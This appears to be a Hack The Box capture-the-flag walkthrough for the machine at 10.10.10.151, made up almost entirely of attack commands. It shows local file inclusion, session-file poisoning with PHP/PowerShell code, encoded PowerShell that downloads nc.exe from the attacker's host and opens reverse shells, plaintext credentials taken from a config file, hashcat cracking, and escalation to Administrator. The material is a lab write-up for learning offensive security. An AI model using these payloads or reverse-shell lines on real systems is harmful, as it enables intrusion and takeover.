```
nmap -sS -sC -sV -T5 -Pn 10.10.10.151
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d10ea320-e050-459d-acae-bdd53145239f)


```
dirsearch -u http://10.10.10.151
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f71e06f1-a92b-45f0-9569-36abf5b4fc20)


```
http://10.10.10.151/user/login.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3108370e-7d17-4044-bc53-b155a24715db)


```
http://10.10.10.151/blog/?lang=blog-en.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1938379a-5aba-4cfc-9a85-664c411c7961)


```
http://10.10.10.151/blog/?lang=/windows/win.ini
```
![image](https://github.com/regarmulia/HTB/assets/33616880/99bed695-53ec-42df-8947-447c03df21ef)

![image](https://github.com/regarmulia/HTB/assets/33616880/be0201a7-e2fa-4074-855b-ee4940d22ddc)


```
curl -X GET http://10.10.10.151/blog/?lang=/windows/win.ini
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c1f65f6b-d039-409d-bf41-6a184857e0b1)

![image](https://github.com/regarmulia/HTB/assets/33616880/8f1d5518-7621-4482-820f-7ec6398a654c)


```
register: sahrul / sahrul
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8bc2d8e8-ab6b-4326-94b7-ce39e1bde815)

![image](https://github.com/regarmulia/HTB/assets/33616880/ff3420ae-e34e-429b-b476-d220a6ed407c)


```
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0ff25a5e-e668-4a61-b1a3-7fdc8c35758d)


```
<?=`powershell whoami`?> / pass123
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
```
![image](https://github.com/regarmulia/HTB/assets/33616880/37fbe64e-402f-468f-bf77-430b8032a3dc)


```
echo "wget http://10.10.14.2/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
<?=`powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAG4AYwAuAGUAeABlACAALQBvACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUACgA=`?>
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ffc7a306-0748-48d2-80d8-3d3eaa0a336a)

![image](https://github.com/regarmulia/HTB/assets/33616880/eaa0c1cc-0bde-4075-8887-61603ff1ee7b)


```
echo "C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.14.2 4444" | iconv -t UTF-16LE | base64
<?=`powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgADQANAA0ADQACgA=`?>
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
```
![image](https://github.com/regarmulia/HTB/assets/33616880/122a5a22-49fd-41a7-898d-2ba9e806c273)


```
more C:\inetpub\wwwroot\user\db.php
$password = convertto-securestring -AsPlainText -Force -String
"36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget
http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 4444} -credential $credential;
```


```
wget http://10.10.14.23/instructions.chm -o C:\Users\chris\instructions.chm
hashcat -m 5600 --force hash.txt rockyou.txt
$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\Administrator",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 5555} -credential $credential;
```
